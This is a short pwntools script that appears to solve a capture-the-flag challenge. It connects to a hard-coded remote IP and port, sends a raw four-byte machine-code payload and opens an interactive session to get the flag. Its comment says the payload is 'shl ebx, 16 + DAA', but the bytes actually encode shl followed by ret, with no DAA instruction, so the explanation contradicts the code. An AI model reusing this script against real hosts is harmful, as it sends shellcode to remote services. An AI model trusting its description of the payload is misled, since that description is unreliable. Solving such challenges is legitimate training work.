from pwn import *

# Connect to the remote instance
# Replace '154.57.164.73' and 32496 with your specific instance IP and Port
r = remote('154.57.164.73', 32496)

# Payload: shl ebx, 16 + DAA (which triggers SIGILL)
payload = b'\xc1\xe3\x10\xc3' 
# Wait for prompt and send
r.recvuntil(b'$ ')
r.send(payload)

# Receive the flag
r.interactive()
